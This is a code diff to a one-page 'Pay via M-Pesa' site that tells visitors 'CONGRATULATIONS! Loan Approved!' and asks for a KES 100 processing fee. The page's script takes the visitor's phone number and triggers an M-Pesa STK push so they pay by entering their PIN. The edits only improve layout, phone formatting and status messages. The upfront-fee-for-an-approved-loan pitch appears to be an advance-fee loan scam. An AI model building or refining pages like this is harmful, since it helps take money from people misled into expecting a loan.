@@ -2,6 +2,7 @@
 <html>
 <head>
     <title>Pay via M-Pesa</title>
+
     <style>
         body {
             font-family: Arial;
@@ -9,37 +10,42 @@
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
+            min-height: 100vh;
+            margin: 0;
         }
 
         .card {
             background: white;
-            padding: 25px;
-            border-radius: 10px;
-            width: 300px;
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            padding: 30px;
+            border-radius: 12px;
+            width: 75vw;              /* 3/4 screen */
+            max-width: 500px;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.15);
         }
 
         h2 {
             margin-bottom: 15px;
+            font-size: 26px;
         }
 
         input {
             width: 100%;
-            padding: 10px;
-            margin: 8px 0;
+            padding: 14px;
+            margin: 10px 0;
             border: 1px solid #ccc;
-            border-radius: 5px;
+            border-radius: 8px;
+            font-size: 16px;
         }
 
         button {
             width: 100%;
-            padding: 10px;
+            padding: 14px;
             background: green;
             color: white;
             border: none;
-            border-radius: 5px;
+            border-radius: 8px;
             cursor: pointer;
+            font-size: 16px;
         }
 
         button:hover {
@@ -47,8 +53,8 @@
         }
 
         .msg {
-            margin-top: 10px;
-            font-size: 14px;
+            margin-top: 12px;
+            font-size: 15px;
         }
     </style>
 </head>
@@ -56,9 +62,9 @@
 <body>
 
 <div class="card">
-    <h2>CONGRATULATIONS Loan Approved! Pay KES 100 Processing Fee Now</h2>
+    <h2>CONGRATULATIONS! Loan Approved!Pay KES 100 Processing Fee Now</h2>
 
-    <input type="text" id="phone" placeholder="0712345678">
+    <input type="text" id="phone" placeholder="Enter phone e.g. 0712345678">
     <input type="hidden" id="amount" value="100">
 
     <button onclick="pay()">Pay Now</button>
@@ -67,11 +73,30 @@
 </div>
 
 <script>
-async function pay() {
-    let phone = document.getElementById("phone").value;
-    let amount = document.getElementById("amount").value;
+function formatPhone(phone) {
+    phone = phone.trim();
 
-    document.getElementById("msg").innerText = "Processing payment...";
+    // Convert 07xxxxxxxx → 2547xxxxxxxx
+    if (phone.startsWith("0")) {
+        phone = "254" + phone.substring(1);
+    }
+
+    return phone;
+}
+
+async function pay() {
+    let phoneInput = document.getElementById("phone").value;
+    let amount = document.getElementById("amount").value;
+    let msg = document.getElementById("msg");
+
+    if (!phoneInput) {
+        msg.innerText = "Please enter phone number";
+        return;
+    }
+
+    let phone = formatPhone(phoneInput);
+
+    msg.innerText = "📲 Sending STK request...";
 
     try {
         let res = await fetch("/stkpush", {
@@ -88,16 +113,13 @@ async function pay() {
         let data = await res.json();
 
         if (data.ResponseCode === "0") {
-            document.getElementById("msg").innerText =
-                "STK sent! Enter PIN on your phone.";
+            msg.innerText = "✅ STK sent! Check your phone and enter PIN.";
         } else {
-            document.getElementById("msg").innerText =
-                "Payment failed. Try again.";
+            msg.innerText = "❌ Payment failed. Try again.";
         }
 
     } catch (err) {
-        document.getElementById("msg").innerText =
-            "Error connecting to server.";
+        msg.innerText = "⚠️ Server error. Try again.";
     }
 }
 </script>
